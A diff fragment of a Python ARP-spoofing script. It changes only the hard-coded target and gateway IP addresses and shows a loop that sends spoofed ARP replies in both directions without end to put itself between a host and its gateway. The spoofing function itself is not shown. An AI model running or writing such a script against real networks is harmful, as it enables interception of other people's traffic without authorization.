@@ -5,8 +5,8 @@ import argparse
 
 def get_arguments():
     parser = argparse.ArgumentParser()
-    parser.add_argument("-t", "--target", dest="target", default="172.16.13.110", help="Target IP")
-    parser.add_argument("-g", "--gateway", dest="gateway", default="172.16.255.254", help="Gateway IP")
+    parser.add_argument("-t", "--target", dest="target", default="10.0.0.6", help="Target IP")
+    parser.add_argument("-g", "--gateway", dest="gateway", default="10.0.0.138", help="Gateway IP")
     args = parser.parse_args()
     return args.target, args.gateway
 # Get target mac address using ip address
@@ -42,8 +42,8 @@ options = get_arguments()
 sent_packets_count = 0
 try:
     while True:
-        spoof("172.16.13.110", "172.16.255.254")
-        spoof("172.16.255.254", "172.16.13.110")
+        spoof("10.0.0.6", "10.0.0.138")
+        spoof("10.0.0.138", "10.0.0.6")
         sent_packets_count += 2
         print(f"\r[+] Packets sent: {sent_packets_count}", end="")
         time.sleep(0)
